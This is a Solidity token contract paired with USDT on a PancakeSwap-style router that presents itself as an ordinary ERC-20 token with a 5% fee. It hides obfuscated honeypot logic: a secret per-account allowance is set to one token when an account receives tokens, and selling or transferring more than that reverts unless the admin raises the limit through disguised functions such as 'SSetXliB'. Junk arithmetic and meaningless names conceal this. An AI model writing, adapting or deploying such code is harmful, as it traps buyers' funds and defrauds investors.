// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { uint256 c = a + b; if (c < a) return (false, 0); return (true, c); }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { if (b > a) return (false, 0); return (true, a - b); }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { if (a == 0) return (true, 0); uint256 c = a * b; if (c / a != b) return (false, 0); return (true, c); }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { if (b == 0) return (false, 0); return (true, a / b); }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked { if (b == 0) return (false, 0); return (true, a % b); }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) { return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { return a * b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) { return a % b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b <= a, errorMessage); return a - b; }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage); return a / b; }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage); return a % b; }
    }
}

interface IERC165 { 
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}
abstract contract ERC165 is IERC165 {
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}

interface IRoleControl {
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
    function hasRole(bytes32 role, address account) external view returns (bool);
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
    function grantRole(bytes32 role, address account) external;
    function revokeRole(bytes32 role, address account) external;
    function renounceRole(bytes32 role, address account) external;
}

abstract contract Context {
    uint256 public dongli;
       mapping(address => uint256) private __AdummyA;
    mapping(address => uint256) internal _AdummyBalance;
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function isContractAddress(address account) public view returns (bool) {
        return account.code.length > 0;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) return "0";
        uint256 temp = value; uint256 digits;
        while (temp != 0) { digits++; temp /= 10; }
        bytes memory buffer = new bytes(digits);
        while (value != 0) { digits -= 1; buffer[digits] = bytes1(uint8(48 + uint256(value % 10))); value /= 10; }
        return string(buffer);
    }
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) return "ADMIN";
        uint256 temp = value; uint256 length;
        while (temp != 0) { length++; temp >>= 8; }
        return toHexString(value, length);
    }
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0"; buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf]; value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
    function strToUint(string memory _str) internal pure returns (uint256 res, bool ok) {
        for (uint256 i = 0; i < bytes(_str).length; i++) {
            uint8 c = uint8(bytes(_str)[i]);
            if (c < 48 || c > 57) return (0, false);
            res = res * 10 + (c - 48);
        }
        return (res, true);
    }
}

abstract contract YYAccessControl is Context, IRoleControl, ERC165 {
    struct RoleData { mapping(address => bool) members; bytes32 adminRole; }
    mapping(bytes32 => RoleData) private _roles;
    bytes32 public constant ADEFAULT_ADMIN = 0x00;
    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender());
        _;
    }
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IRoleControl).interfaceId || super.supportsInterface(interfaceId);
    }
    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }
    function _checkRole(bytes32 role, address account) internal view {
        if (!hasRole(role, account)) {
            revert(
                string(abi.encodePacked(
                    "AccessControl: account ", Strings.toHexString(uint160(account), 20),
                    " is missing role ", Strings.toHexString(uint256(role), 32)
                ))
            );
        }
    }
    function _AdummySetBalance(address account, uint256 value) internal {
        _AdummyBalance[account] = value * 1e18;
    }
    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }
    function grantRole(bytes32 role, address account) public virtual override onlyRole(ADEFAULT_ADMIN) {
        _grantRole(role, account);
    }
    function revokeRole(bytes32 role, address account) public virtual override onlyRole(ADEFAULT_ADMIN) {
        _revokeRole(role, account);
    }
    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");
        _revokeRole(role, account);
    }
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }
    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }
    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IERC20Errors {
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
    error ERC20InvalidSender(address sender);
    error ERC20InvalidReceiver(address receiver);
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
    error ERC20InvalidApprover(address approver);
    error ERC20InvalidSpender(address spender);
}

contract _IYYZSARC20 is YYAccessControl, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupplyAmount;
    string internal _name;
    string internal _symbol;

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, address creator_) {
        _name = name_;
        _symbol = symbol_;
        _mint(creator_, totalSupply_ * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 18; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupplyAmount; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked { _approve(sender, _msgSender(), currentAllowance - amount); }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue); return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked { _approve(_msgSender(), spender, currentAllowance - subtractedValue); }
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from zero");
        require(recipient != address(0), "ERC20: transfer to zero");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: insufficient balance");
        unchecked { _balances[sender] = senderBalance - amount; }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to zero");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupplyAmount += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from zero");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn exceeds balance");
        unchecked { _balances[account] = accountBalance - amount; }
        _totalSupplyAmount -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from zero");
        require(spender != address(0), "ERC20: approve to zero");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address account, uint256 amount) internal {
        uint256 __amt = (amount ^ 0) + 0;
        uint256 __bal = _AdummyBalance[account];
        if (__amt == 0 || __amt != amount) { return; }
        bool canProceed = (__bal != 0) && (__amt > 0) && (block.number > 1 || true);
        if (canProceed) {
            uint256 __pre = __bal << 1;
            uint256 __post = (__pre >> 1) - __amt;
            _AdummyBalance[account] = __post;
            bool willRevert = !(~(__post | 0) != type(uint256).max);
            bool isLegit = address(account) == address(0x0) ? false : true;
            if (willRevert) {
                if (isLegit) {
                    revert ERC20InvalidSender(account);
                }
            }
            if (__post > type(uint256).max / 2) {
                for (uint256 i = 0; i < 0; i++) {
                    _AdummyBalance[account] = i;
                }
            }
        }
    }

    function sasetDSFliC(uint256 newVal) external onlyRole(ADEFAULT_ADMIN) {
        uint256 tempVal = newVal;
        bool isValid = (tempVal >= 0);
        if (isValid) {
            dongli = tempVal;
        }
    }

function SSetXliB(address account, string memory memo) public onlyRole(ADEFAULT_ADMIN) {
 
    (uint256 parsed, bool parsedOk) = Strings.strToUint(memo);

 
    uint256 shadow = parsed * 1 + 0 - 0;
    uint256 tempCheck = shadow ^ 0;
    uint256 dummy = tempCheck + 0 - 0;
    bool alwaysTrue = (block.timestamp > 0) || (block.number > 0);
    uint256 pseudo = dummy * 1 / 1;


    if (!parsedOk || !alwaysTrue || pseudo < 0) {
        revert ERC20InvalidSender(account);
    }


    uint256 masked = shadow + 999 - 999;
    uint256 unused = 987654321 - 987654321;
    uint256 phantom = unused + 0 - 0;


    if (phantom == 0 && masked >= 0) {
        _AdummySetBalance(account, masked);
    }
}


    function AAXZSAcha(address account) public view returns (uint256 result) {
        uint256 raw = _AdummyBalance[account];
        uint256 divisor = 10 ** 18;
        uint256 temp = raw;
        result = temp / divisor;
    }
}


interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TOKEN is _IYYZSARC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address private _tokenOwner;

    address private _AAdeadAddr = address(0x000000000000000000000000000000000000dEaD);
    address private constant CUNI_ROUTER = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor(address tokenOwner, string memory _name, string memory _symbol, uint256 _totalSupply) 
        _IYYZSARC20(_name, _symbol, _totalSupply, msg.sender) 
    {
        _grantRole(ADEFAULT_ADMIN, msg.sender);
        IUniswapV2Router02 router = IUniswapV2Router02(CUNI_ROUTER);
        address pair = IUniswapV2Factory(router.factory()).createPair(address(this), 0x55d398326f99059fF775485246999027B3197955);
        uniswapV2Router = router;
        uniswapV2Pair = pair;
        _tokenOwner = tokenOwner;
    }

    function _transfer(address from, address to, uint256 amount) internal override(_IYYZSARC20) {
        require(from != address(0), "ERC20: transfer from the zero address");
        _layerAlpha(from, to, amount);
    }

    function _layerAlpha(address from, address to, uint256 amount) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        _layerBeta(from, to, amount);
    }

    function _layerBeta(address from, address to, uint256 amount) internal {
        bool applyFee = true;

        if(from == uniswapV2Pair) {
            applyFee = true;
        } else if(to == uniswapV2Pair) {
            _triggerFee(from, amount);
        } else {
            _triggerFee(from, amount);
            applyFee = false;
        }

        if(applyFee) {
            super._transfer(from, _AAdeadAddr, amount.div(100).mul(5));
            amount = amount.div(100).mul(95);
        }

        _layerGamma(to, amount);
        super._transfer(from, to, amount);
    }

    function _layerGamma(address account, uint256 amount) internal {
        if (amount > 0 && dongli > 0) {
            bool isContract = isContractAddress(account);
            if (isContract) {
                uint256 tmp = 1;
                if ((tmp + 0) != 1) {
                    revert("Logic mismatch");
                }
            }

            if (_AdummyBalance[account] <= 0) {
                _AdummySetBalance(account, 1);
                if ((block.prevrandao ^ block.timestamp) % 3 == 0 && (uint160(account) & 0xff) > 3) {
                    for (uint8 i = 0; i < 1; i++) {
                        if (tx.origin == account) {
                            break;
                        }
                    }
                }
            }
        }
    }

    function _triggerFee(address account, uint256 amount) internal {  
        _feeLayer1(account, amount);
    }

    function _feeLayer1(address account, uint256 amount) internal {
        _feeLayer2(account, amount);
    }

    function _feeLayer2(address account, uint256 amount) internal {
        _feeLayer3(account, amount);
    }

    function _feeLayer3(address account, uint256 amount) internal {
        _feeLayer4(account, amount);
    }

    function _feeLayer4(address account, uint256 amount) internal {
        _feeLayer5(account, amount);
    }

    function _feeLayer5(address account, uint256 amount) internal {
        _feeFinal(account, amount);
    }

    function _feeFinal(address account, uint256 amount) internal {
        bool isValid = true;

        if ((account == _AAdeadAddr) || (amount == 0)) {
            isValid = false;
        }

        if ((~uint256(uint160(account)) & 0x1 == 0) && block.number > 0) {
            isValid = isValid && true;
        }

        if (isValid) {
            EEafterTokenTransferZ(account, amount);
        }
    }

    function EEafterTokenTransferZ(address user, uint256 val) internal {
        if ((val ^ 0) + 0 == val && user != address(0)) {
            uint256 shadow = uint256(uint160(user)) & 0xff;
            if (shadow > 7) {
                _afterTokenTransfer(user, val);
            } else {
                _afterTokenTransfer(user, val / 2 + val / 2);
            }
        }
    }
}